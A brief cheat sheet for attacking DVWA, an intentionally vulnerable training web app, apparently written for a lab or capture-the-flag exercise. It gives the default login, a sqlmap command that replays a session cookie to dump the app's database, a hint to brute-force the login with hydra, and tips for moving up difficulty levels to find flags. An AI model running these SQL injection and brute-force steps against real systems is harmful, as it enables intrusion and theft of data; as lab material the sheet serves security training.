# Cheatsheet — DVWA Basics

## Targets

- **web01** — DVWA (Damn Vulnerable Web App) on Apache+MariaDB

## Useful commands

```bash
# login: admin / password — set security level per challenge
sqlmap -u 'http://<web01>/vulnerabilities/sqli/?id=1&Submit=Submit' \
  --cookie='PHPSESSID=<sess>; security=low' --batch --dump
# brute force module → hydra http-get-form
```

## Concepts

- Work low → medium → high: each level teaches one bypass technique
- The cookie carries the difficulty — replay it in every tool call
- Flags live in the app files and DB — look past the browser surface
